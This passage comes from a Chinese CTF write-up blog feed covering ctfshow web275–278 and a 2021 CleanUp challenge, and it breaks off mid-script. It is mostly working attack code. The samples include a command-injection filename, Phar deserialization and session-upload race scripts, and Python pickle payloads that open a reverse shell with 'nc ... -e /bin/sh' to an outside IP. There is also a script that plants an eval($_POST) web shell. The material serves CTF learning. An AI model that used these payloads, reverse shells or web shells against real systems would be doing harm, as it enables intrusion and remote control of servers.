class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="web275命令执行拼接">web275（命令执行拼接）</h3><p>这道题其实跟反序列化没有什么关系，主要的点在于rce。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">filter</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filecontent</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evilfile</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$fn</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;filecontent=<span class="hljs-variable">$fn</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkevil</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/php|\.\./i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;evilfile=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;filecontent))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;evilfile=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;evilfile;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;evilfile)&#123;<br>            system(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> filter(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>],<span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span>-&gt;checkevil()===<span class="hljs-literal">false</span>)&#123;<br>        file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>], <span class="hljs-variable">$content</span>);<br>        copy(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="hljs-string">&#x27;.txt&#x27;</span>);<br>        unlink(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fn&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;work done&#x27;</span>;<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;where is flag?&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码的大致意思就是，创建一个符合要求的文件，创建后重命名删除。</p><p>但是奇怪的点在于，这个<code>filter</code>在最后来了一手<code>system</code>删除，导致我们可以利用<code>filename</code>这个属性去直接<code>rce</code>。</p><h3 id="web276phar反序列化">web276（Phar反序列化）</h3><p>生成phar文件的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">filter</span> </span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;;cat fl*&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$evilfile</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 后缀必须为phar</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;evil.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-comment">// 设置 stubb, 增加 gif 文件头</span><br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> filter();<br><br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>);<br>    <span class="hljs-comment">// 添加需压缩的文件</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>附上Python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> base64<br><br>flag = <span class="hljs-literal">False</span><br>url = <span class="hljs-string">&#x27;http://f7ba2098-5519-45ab-b82c-bce8b1563724.challenge.ctf.show/&#x27;</span><br><span class="hljs-comment"># url = &quot;http://127.0.0.1&quot;</span><br><br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;evil.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><span class="hljs-comment"># 写入phar的内容</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>():</span><br>    requests.post(url+<span class="hljs-string">&quot;?fn=evil.phar&quot;</span>, data=data)<br><br><span class="hljs-comment"># file_put_contents 触发 phar 内容</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">global</span> flag<br>    r = requests.post(url+<span class="hljs-string">&quot;?fn=phar://evil.phar/test&quot;</span>, data=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&#123;&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> flag <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>        <span class="hljs-built_in">print</span>(base64.b64encode(r.text.encode()))<br>        flag = <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">elif</span> r.status_code == <span class="hljs-number">503</span>:<br>        flag = <span class="hljs-literal">True</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我寄了&quot;</span>)<br><br><span class="hljs-comment"># 预先测试一下URL</span><br>pre_resp = requests.get(url)<br><span class="hljs-keyword">if</span> pre_resp.status_code != <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&#x27;\n链接好像挂了....&#x27;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 多线程竞争</span><br><span class="hljs-keyword">while</span> flag <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>    w = threading.Thread(target=write)<br>    r = threading.Thread(target=read)<br>    w.start()<br>    r.start()<br></code></pre></td></tr></table></figure><h3 id="web277python反序列化">web277（Python反序列化）</h3><p>这道题是Python反序列的入门，这里先附上两篇写得很好的博客：</p><p>https://x5tar.com/posts/python-pickle-unserialize/</p><p>https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</p><p>这道题的payload的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whistle</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc 121.5.227.123 2333 -e /bin/sh&#x27;)&quot;</span>,))<br>        <span class="hljs-comment">#return(__import__(&quot;os&quot;).system, (&#x27;sleep 2s&#x27;,))</span><br><br>whistleH = whistle()<br>whistle_ser = pickle.dumps(whistleH)<br><br><br>url = <span class="hljs-string">&quot;http://009358c5-cae3-4e2a-baa7-f1ba8982a75c.challenge.ctf.show/backdoor&quot;</span><br><br>params = &#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: base64.b64encode(whistle_ser)<br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>,<br>    <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>r = requests.get(url=url,params=params,proxies=proxies)<br><br><span class="hljs-comment"># whistle_unser = pickle.loads(whistle_ser)</span><br><span class="hljs-comment"># print(whistle_ser)</span><br></code></pre></td></tr></table></figure><h3 id="web278python-反序列化">web278（Python 反序列化）</h3><p>过滤了<code>os.system</code>，我们可以换一个rce的函数</p><p>附上payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whistle</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 121.5.227.123 1337 -e /bin/sh&#x27;)&quot;</span>,)) <span class="hljs-comment">#curl https://your-shell.com/121.5.227.123:1337 | sh</span><br>        <span class="hljs-comment">#return(__import__(&quot;os&quot;).system, (&#x27;sleep 2s&#x27;,))</span><br><br>whistleH = whistle()<br>whistle_ser = pickle.dumps(whistleH)<br><br><br>url = <span class="hljs-string">&quot;http://4dc0e2a0-adb6-4c12-bbd5-78c559e7f313.challenge.ctf.show/backdoor&quot;</span><br><br>params = &#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: base64.b64encode(whistle_ser)<br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>,<br>    <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>r = requests.get(url=url,params=params,proxies=proxies)<br><br><span class="hljs-comment"># whistle_unser = pickle.loads(whistle_ser)</span><br><span class="hljs-comment"># print(whistle_ser)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-Web-wp</title>
    <link href="/2022/04/13/blog0013-NSS-Web-wp/"/>
    <url>/2022/04/13/blog0013-NSS-Web-wp/</url>
    
    <content type="html"><![CDATA[<p>记录一下在各种平台做到一些题目</p><span id="more"></span><h2 id="lfi">1、LFI</h2><h3 id="第五空间-cleanup条件竞争">1、2021第五空间-CleanUp（条件竞争）</h3><p>直接放上源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>]))&#123; <br>        highlight_file(<span class="hljs-keyword">__file__</span>); <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] == <span class="hljs-string">&quot;eval&quot;</span>)&#123; <br>        <span class="hljs-variable">$shell</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>] : <span class="hljs-string">&#x27;phpinfo();&#x27;</span>; <br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$shell</span>) &gt; <span class="hljs-number">15</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">if</span>(filter(<span class="hljs-variable">$shell</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;filter&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">if</span>(checkNums(<span class="hljs-variable">$shell</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;shell&quot;</span>); <br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>); <br>    &#125; <br><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &gt; <span class="hljs-number">15</span> | filter(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker&quot;</span>); <br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]; <br>    &#125; <br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br>        <span class="hljs-variable">$banned</span> = [<span class="hljs-string">&quot;while&quot;</span>, <span class="hljs-string">&quot;for&quot;</span>, <span class="hljs-string">&quot;\$_&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>]; <br><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$banned</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$ban</span>)&#123; <br>            <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$var</span>, <span class="hljs-variable">$ban</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>; <br>        &#125; <br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>; <br>    &#125; <br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkNums</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123; <br>        <span class="hljs-variable">$alphanum</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; <br>        <span class="hljs-variable">$cnt</span> = <span class="hljs-number">0</span>; <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$alphanum</span>); <span class="hljs-variable">$i</span>++)&#123; <br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; strlen(<span class="hljs-variable">$var</span>); <span class="hljs-variable">$j</span>++)&#123; <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$var</span>[<span class="hljs-variable">$j</span>] == <span class="hljs-variable">$alphanum</span>[<span class="hljs-variable">$i</span>])&#123; <br>                    <span class="hljs-variable">$cnt</span> += <span class="hljs-number">1</span>; <br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$cnt</span> &gt; <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>; <br>                &#125; <br>            &#125; <br>        &#125; <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>; <br>    &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单分析之后，我们可以发现首先对注入的代码长度做出了限制，还对字符做出了限制，这样我们能打的空间比较小了。</p><p>尝试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">mode=eval&amp;shell=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p>于是找到了flag在根目录下，其实看到docker环境想试试pearcmd.php能不能利用上，但是被长度限制卡死了。</p><p>接下来可以考虑试试能不能卡临时文件包含（这个其实也只能猜，因为其实没有给session，试试看）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sess_id = <span class="hljs-string">&quot;p&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28475/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_file</span>(<span class="hljs-params">session</span>):</span><br>    content = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(<br>            url=url,         <br>            data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php system(&#x27;cat /nssctfasdasdflag&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess_id&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;a.txt&#x27;</span>, content)&#125;,<br>        )<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;上传文件----&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_content</span>(<span class="hljs-params">session</span>):</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/tmp/sess_&quot;</span> + sess_id<br>    &#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.html&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fout:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            r = session.get(url=url,params=params)<br>            check = <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span><br>            <span class="hljs-keyword">if</span> check <span class="hljs-keyword">in</span> r.text:<br>                fout.write(r.text)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;retry---&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        t1 = Thread(target=post_file, args=(session,))<br>        t2 = Thread(target=get_content,args=(session,))<br>        t1.start()<br>        t2.start()<br></code></pre></td></tr></table></figure><p>其实最开始想要将命令逃逸出去实现任意RCE，但是发现好像并没有写的权限（这里也附上脚本，说不定啥时候就能一把梭了）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sess_id = <span class="hljs-string">&quot;p&quot;</span><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28475/&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span class="hljs-params">session</span>):</span><br>    content = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">20</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        session.post(<br>            url=url,         <br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span><br>            &#125;,<br>            cookies=&#123;<br>                <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess_id<br>            &#125;,<br>            files=&#123;<br>                <span class="hljs-string">&quot;file&quot;</span>: (<span 